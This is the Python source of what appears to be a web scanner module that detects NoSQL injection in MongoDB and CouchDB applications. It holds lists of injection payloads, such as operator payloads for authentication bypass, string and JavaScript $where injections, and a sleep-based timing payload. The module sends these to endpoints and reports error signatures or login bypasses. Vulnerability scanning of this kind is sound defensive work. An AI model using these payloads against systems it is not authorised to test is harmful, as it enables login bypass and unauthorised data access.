"""
NoSQL Injection Detector
Detects NoSQL injection vulnerabilities in MongoDB, CouchDB, and other NoSQL databases
"""

import re
import json
import logging

logger = logging.getLogger(__name__)


class NoSQLInjectionDetector:
    """Detect NoSQL injection vulnerabilities
    
    Tests for NoSQL injection using:
    1. MongoDB operator injection ($gt, $ne, $where, etc.)
    2. JavaScript injection in $where clauses
    3. Authentication bypass patterns
    4. CouchDB-specific attacks
    """
    
    # MongoDB operator injection payloads
    MONGODB_PAYLOADS = [
        {"$gt": ""},  # Greater than (bypasses authentication)
        {"$ne": None},  # Not equal to null
        {"$ne": ""},  # Not equal to empty
        {"$ne": 1},
        {"$nin": [1]},  #Not in array
        {"$exists": True},  # Field exists
        {"$regex": ".*"},  # Regex match all
        {"$where": "1==1"},  # JavaScript injection
        {"$or": [{"a": 1}, {"a": 2}]},  # OR condition
    ]
    
    # String-based MongoDB injection (when input is treated as string)
    MONGODB_STRING_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$nin": [1]}',
        '{"$exists": true}',
        '{"$regex": ".*"}',
        "' || '1'=='1",
        "' || 1==1//",
        "\\' || 1==1//",
        "'; return true; var dummy='",
    ]
    
    # MongoDB JavaScript injection (for $where operator)
    MONGODB_JS_PAYLOADS = [
        "'; return true; var x='",
        "1; return true",
        "'; sleep(5000); var x='",
        '"; return true; var x="',
    ]
    
    # CouchDB injection payloads
    COUCHDB_PAYLOADS = [
        '_all_docs',
        '_all_dbs',
        '/_utils',
    ]
    
    # Quick mode payloads
    QUICK_PAYLOADS = [
        {"$ne": None},
        {"$gt": ""},
        '{"$ne": null}',
        "' || '1'=='1",
    ]
    
    # Error signatures for NoSQL databases
    ERROR_SIGNATURES = [
        'mongo',
        'mongodb',
        'nosql',
        'mongoose',
        'couchdb',
        'cassandra',
        'redis',
        'invalid bson',
        'malformed bson',
        'query failed',
        'operator',
        'expected bson',
    ]
    
    # Success indicators (authentication bypass)
    SUCCESS_INDICATORS = [
        'logged in',
        'welcome',
        'dashboard',
        'admin',
        'user profile',
        'authentication successful',
        'login successful',
    ]
    
    # Common parameter names
    COMMON_PARAMS = [
        'username', 'user', 'email', 'login', 'id', 'userid',
        'password', 'pass', 'pwd', 'search', 'query', 'filter',
        'where', 'find', 'match', 'select'
    ]
    
    def __init__(self, client, quick_mode=False):
        """Initialize NoSQL injection detector
        
        Args:
            client: HTTP client for making requests
            quick_mode: If True, use only high-confidence payloads
        """
        self.client = client
        self.quick_mode = quick_mode
        logger.info(f"NoSQL Injection Detector initialized (quick_mode={quick_mode})")
    
    def test(self, path, param=None):
        """Test endpoint for NoSQL injection"""
        params_to_test = [param] if param else self.COMMON_PARAMS
        
        # Reduce params in quick mode
        if self.quick_mode and not param:
            params_to_test = self.COMMON_PARAMS[:5]
        
        for test_param in params_to_test:
            # Test operator injection
            result = self._test_operator_injection(path, test_param)
            if result:
                return result
            
            # Test string-based injection
            result = self._test_string_injection(path, test_param)
            if result:
                return result
            
            # Test JavaScript injection (skip in quick mode)
            if not self.quick_mode:
                result = self._test_js_injection(path, test_param)
                if result:
                    return result
        
        return None
    
    def _test_operator_injection(self, path, param):
        """Test MongoDB operator injection"""
        payloads = [self.QUICK_PAYLOADS[0], self.QUICK_PAYLOADS[1]] if self.quick_mode else self.MONGODB_PAYLOADS
        
        for payload in payloads:
            try:
                # Baseline request
                baseline = self.client.get(path, params={param: "test123"})
                baseline_text = baseline.text.lower() if baseline and baseline.text else ""
                baseline_status = baseline.status_code if baseline else 0
                
                # Test with JSON payload (if API accepts JSON)
                try:
                    res_json = self.client.post(
                        path,
                        json={param: payload},
                        headers={'Content-Type': 'application/json'}
                    )
                    
                    if res_json and res_json.text:
                        response_text = res_json.text.lower()
                        
                        # Check for error messages
                        for error in self.ERROR_SIGNATURES:
                            if error in response_text and error not in baseline_text:
                                return {
                                    "type": "nosql_injection",
                                    "subtype": "operator_injection",
                                    "endpoint": path,
                                    "param": param,
                                    "payload": str(payload),
                                    "evidence": f"NoSQL error detected: {error}",
                                    "confidence": 0.85,
                                    "severity": "high",
                                    "description": "MongoDB operator injection via JSON"
                                }
                        
                        # Check for authentication bypass (status code change)
                        if res_json.status_code in [200, 201, 302] and baseline_status in [401, 403]:
                            return {
                                "type": "nosql_injection",
                                "subtype": "authentication_bypass",
                                "endpoint": path,
                                "param": param,
                                "payload": str(payload),
                                "evidence": f"Status changed from {baseline_status} to {res_json.status_code}",
                                "confidence": 0.9,
                                "severity": "critical",
                                "description": "NoSQL injection allows authentication bypass"
                            }
                        
                        # Check for success indicators
                        for indicator in self.SUCCESS_INDICATORS:
                            if indicator in response_text and indicator not in baseline_text:
                                return {
                                    "type": "nosql_injection",
                                    "subtype": "authentication_bypass",
                                    "endpoint": path,
                                    "param": param,
                                    "payload": str(payload),
                                    "evidence": f"Success indicator found: {indicator}",
                                    "confidence": 0.75,
                                    "severity": "critical"
                                }
                
                except Exception as e:
                    logger.debug(f"JSON NoSQL test error: {e}")
                
                # Test with URL-encoded JSON string
                try:
                    json_str = json.dumps(payload)
                    res = self.client.get(path, params={param: json_str})
                    
                    if res and res.text:
                        response_text = res.text.lower()
                        
                        for error in self.ERROR_SIGNATURES:
                            if error in response_text and error not in baseline_text:
                                return {
                                    "type": "nosql_injection",
                                    "subtype": "operator_injection",
                                    "endpoint": path,
                                    "param": param,
                                    "payload": json_str,
                                    "evidence": f"NoSQL error detected: {error}",
                                    "confidence": 0.8,
                                    "severity": "high"
                                }
                
                except Exception:
                    continue
            
            except Exception as e:
                logger.debug(f"Operator injection test error: {e}")
                continue
        
        return None
    
    def _test_string_injection(self, path, param):
        """Test string-based NoSQL injection"""
        payloads = [self.QUICK_PAYLOADS[2], self.QUICK_PAYLOADS[3]] if self.quick_mode else self.MONGODB_STRING_PAYLOADS
        
        for payload in payloads:
            try:
                # Baseline
                baseline = self.client.get(path, params={param: "test123"})
                baseline_text = baseline.text.lower() if baseline and baseline.text else ""
                baseline_status = baseline.status_code if baseline else 0
                
                # Test GET request
                res = self.client.get(path, params={param: payload})
                if not res:
                    continue
                
                response_text = res.text.lower() if res.text else ""
                
                # Check for NoSQL errors
                for error in self.ERROR_SIGNATURES:
                    if error in response_text and error not in baseline_text:
                        return {
                            "type": "nosql_injection",
                            "subtype": "string_injection",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"NoSQL error: {error}",
                            "confidence": 0.85,
                            "severity": "high",
                            "description": "String-based NoSQL injection"
                        }
                
                # Check for authentication bypass
                if res.status_code in [200, 201, 302] and baseline_status in [401, 403]:
                    return {
                        "type": "nosql_injection",
                        "subtype": "authentication_bypass",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Bypassed authentication: {baseline_status} -> {res.status_code}",
                        "confidence": 0.9,
                        "severity": "critical"
                    }
                
                # Test POST request
                res_post = self.client.post(path, data={param: payload})
                if res_post and res_post.text:
                    response_text_post = res_post.text.lower()
                    
                    for error in self.ERROR_SIGNATURES:
                        if error in response_text_post and error not in baseline_text:
                            return {
                                "type": "nosql_injection",
                                "subtype": "string_injection",
                                "endpoint": path,
                                "param": param,
                                "payload": payload,
                                "method": "POST",
                                "evidence": f"NoSQL error via POST: {error}",
                                "confidence": 0.85,
                                "severity": "high"
                            }
            
            except Exception as e:
                logger.debug(f"String injection test error: {e}")
                continue
        
        return None
    
    def _test_js_injection(self, path, param):
        """Test JavaScript injection in $where operator"""
        for payload in self.MONGODB_JS_PAYLOADS:
            try:
                # Test GET
                res = self.client.get(path, params={param: payload})
                if not res:
                    continue
                
                response_text = res.text.lower() if res.text else ""
                
                # Check for MongoDB JavaScript errors
                js_errors = [
                    'javascript',
                    'syntax error',
                    '$where',
                    'invalid javascript',
                    'execution failed',
                ]
                
                for error in js_errors:
                    if error in response_text:
                        return {
                            "type": "nosql_injection",
                            "subtype": "javascript_injection",
                            "endpoint": path,
                            "param": param,
                            "payload": payload,
                            "evidence": f"JavaScript injection error: {error}",
                            "confidence": 0.8,
                            "severity": "critical",
                            "description": "MongoDB JavaScript injection via $where operator"
                        }
            
            except Exception:
                continue
        
        return None
